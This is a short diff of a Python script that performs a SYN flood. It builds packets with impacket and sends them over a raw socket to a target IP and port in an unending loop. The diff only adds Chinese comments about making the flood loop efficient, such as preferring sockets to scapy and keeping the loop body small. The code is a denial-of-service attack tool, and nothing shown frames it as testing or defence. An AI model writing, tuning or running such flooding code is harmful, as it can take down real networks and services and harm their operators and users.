@@ -1,6 +1,6 @@
 from itertools import repeat
 import asyncio
-import socket
+import socket #使用效率更高的socket，而不是scapy
 import impacket.ImpactPacket
 import random
 import multiprocessing
@@ -36,8 +36,8 @@ def packet():
     ip.calculate_checksum()   
 
 def synflood():
-    for _ in repeat(None):
-        s.sendto(ip.get_packet(),(dst_ip,dst_port))
+    for _ in repeat(None): #使用迭代器实现循环
+        s.sendto(ip.get_packet(),(dst_ip,dst_port)) #循环写在函数内部，内容越少越好
 
 if __name__=='__main__':
     packet()
